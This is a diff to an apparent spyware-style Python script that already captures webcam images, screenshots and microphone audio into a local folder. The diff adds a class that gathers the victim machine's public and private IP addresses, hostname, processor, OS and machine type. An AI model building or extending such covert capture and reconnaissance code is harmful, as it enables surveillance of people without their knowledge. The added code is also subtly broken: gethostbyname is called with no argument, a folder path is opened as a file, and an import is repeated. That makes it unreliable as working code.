@@ -1,4 +1,6 @@
 # Libraries
+import socket
+
 import cv2
 from PIL import ImageGrab
 import sounddevice as sd
@@ -7,7 +9,9 @@ import os
 import numpy as np
 import time
 import threading
-
+import socket
+from requests import get
+import platform
 class MainFileException(Exception):
     pass
 
@@ -71,6 +75,27 @@ class MICROPHONE:
         # Save captured audio to the file path
         file_path = os.path.join(self.folder_path, self.output_file_name)
         wf.write(file_path, self.sample_rate, audio_data)
+
+class SYS_INFO:
+    def __init__(self):
+        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Systeminformation"
+        self.public_ip_link = "https://api.ipify.org"
+    def system_information(self):
+        with open(self.folder_path, "a") as f:
+            hostname = socket.gethostbyname()
+            IPAddr = socket.gethostbyname(hostname)
+
+            try:
+                public_ip = get(self.public_ip_link).text
+                f.write(f"Public IP Address: {public_ip}\n")
+            except Exception:
+                f.write("Couldn't get Public IP Address (May be due to max query)\n")
+
+            f.write(f"Processor Info: {platform.processor()}\n")
+            f.write(f"System Info: {platform.system()}\n")
+            f.write(f"Machine Info: {platform.machine()}\n")
+            f.write(f"Hostname: {hostname}\n")
+            f.write(f"Private IP Address: {IPAddr}\n")
 
 def main():
     webcamera = WEBCAMERA
